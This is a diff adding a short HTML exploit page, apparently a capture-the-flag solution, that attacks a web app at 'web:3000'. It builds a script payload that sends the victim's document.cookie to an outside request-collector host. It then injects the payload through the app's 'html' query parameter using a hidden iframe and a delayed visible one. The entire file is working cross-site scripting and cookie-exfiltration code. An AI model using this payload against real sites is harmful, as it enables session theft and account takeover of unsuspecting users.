@@ -1,0 +1,23 @@
+<!doctype html>
+<html>
+<body>
+<script>
+const payload = `<script>
+  (new Image()).src="https://lqfcdxi.request.dreamhack.games/leak?c="+encodeURIComponent(document.cookie);
+<\/script>`;
+
+const q = encodeURIComponent(payload);
+
+const warm = document.createElement("iframe");
+warm.style.display = "none";
+warm.src = "http://web:3000/?html=" + q;
+document.body.appendChild(warm);
+
+setTimeout(() => {
+  const x = document.createElement("iframe");
+  x.src = "http://web:3000/view?html=" + q;
+  document.body.appendChild(x);
+}, 300); 
+</script>
+</body>
+</html>
